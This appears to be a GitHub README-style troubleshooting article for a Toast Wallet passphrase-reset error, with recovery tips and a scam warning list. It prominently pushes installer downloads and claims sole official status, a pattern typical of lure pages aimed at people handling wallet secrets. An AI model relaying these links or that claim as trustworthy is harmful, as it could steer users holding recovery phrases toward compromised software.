<div align="center">

# Fixing "Old Passphrase Is Incorrect" — the #1 Toast Wallet Recovery Error

**Fixing the single most common Toast Wallet recovery error.**

![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)

</div>

---

## 📥 Downloads — v3.0.0

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)

</div>

| Platform | Requirements | File | Checksum |
|---|---|---|---|
| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |

Verify your download against the matching SHA256 file before running any installer — all files
and checksums are also listed together on the
[**official v3.0.0 release page**](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> ⚠️ **This GitHub organization is the only official presence for Toast Wallet — there is no official website.**
> `toastwallet.app` is a known phishing clone impersonating one; see our [full scam warning list](./toast-wallet-scam-warning-list.md).

---

If you're seeing this exact message while trying to reset your Toast Wallet passphrase using your
recovery phrase, you are far from alone — this is the most frequently reported blocker in the
entire recovery process.

**The full error usually reads:**
*"Old passphrase is incorrect. If you are trying to use recovery phrase you may need to restore
backup to PC version first for some devices."*

**Why this happens, most commonly:**

1. **Formatting mismatch in the recovery phrase.** Extra spaces (especially a trailing space
   after the last word), inconsistent capitalization, or the phrase being copy-pasted through
   something that altered it. Try typing all six words manually, all lowercase, with exactly one
   space between each word and no space at the start or end.

2. **You're on the wrong platform for this specific reset flow.** Several users have reported this
   exact error on the Mac build, but had it work correctly after restoring the same backup code
   on the **Windows desktop build** instead. If you're stuck on Mac, try the Windows build from
   the official GitHub releases before assuming your recovery phrase itself is wrong.

3. **The backup code itself is mis-formatted.** Since the passphrase reset operates against the
   restored backup, a corrupted backup code (see
   [our guide to what a valid backup code looks like](./toast-wallet-backup-code-example.md))
   can produce this same misleading error even though the actual problem is upstream.

4. **You're confusing the recovery phrase with something else.** Double-check you're entering the
   6-word Toast-generated recovery phrase, not your original chosen passphrase or an unrelated
   seed phrase from a different wallet. See our
   [terminology breakdown](./passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md) if
   you're not certain which is which.

**Order of operations to try:**
1. Re-copy your backup code through a plain text editor to strip any hidden formatting.
2. Restore it fresh on the Windows desktop build from the
   [official GitHub releases](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).
3. Try the recovery phrase reset again, typed manually, all lowercase, single spaces only.

If it still fails after trying all of the above, you likely have a genuinely mismatched or
incomplete recovery phrase rather than a formatting issue — see our
[full recovery guide](./how-to-recover-xrp-toast-wallet.md) for other paths forward.

---

## ⚠️ Known Scams — Do Not Use These

- **"Toast Plus"** — a fraudulent lookalike app that has stolen an estimated **$5M+ in XRP** and was the subject of a 2021 federal lawsuit against Apple. Read: [The Toast Plus App Scam](./toast-plus-app-scam.md).
- **toastwallet.app** — a phishing clone of the official recovery page; anything imported here gets stolen within minutes. Read: [Toast Wallet Phishing Sites](./toast-wallet-phishing-sites.md).
- **Clone marketing sites** (`xrp-toastwallet.com`, `toast-wallet.com`, `en-toastwallet.com`, `toast-wallet.net`) — unofficial, with fabricated claims about the product.
- **Anyone offering paid XRP "recovery" after you post about a loss** — this is always fraud.

Full reference: [Toast Wallet Scam Alert: Full Warning List](./toast-wallet-scam-warning-list.md). Report scams at [ic3.gov](https://www.ic3.gov).

## Related Articles

- [Should You Use a Brute-Force Tool?](./toast-wallet-brute-force-tool.md)
- [How to Recover XRP From an Old Toast Wallet](./how-to-recover-xrp-toast-wallet.md)
- [What a Toast Wallet Backup Code Looks Like](./toast-wallet-backup-code-example.md)
- [Toast Wallet by Platform](./toast-wallet-by-platform.md)
